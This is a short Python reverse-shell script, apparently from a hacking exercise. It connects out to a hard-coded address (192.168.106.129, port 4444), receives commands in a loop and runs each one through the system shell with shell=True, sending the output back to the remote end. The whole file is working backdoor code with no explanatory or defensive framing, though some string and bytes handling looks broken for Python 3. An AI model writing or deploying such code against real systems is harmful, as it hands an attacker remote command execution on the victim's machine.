import socket 
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('192.168.106.129',4444))

connection.send('\n[+] Connected!!!\n')

while True:
    command = connection.recv(1024)

    if command=='exit':break

    result = execute_system_command(command)
    connection.send(f'\n{result}\n')


connection.close()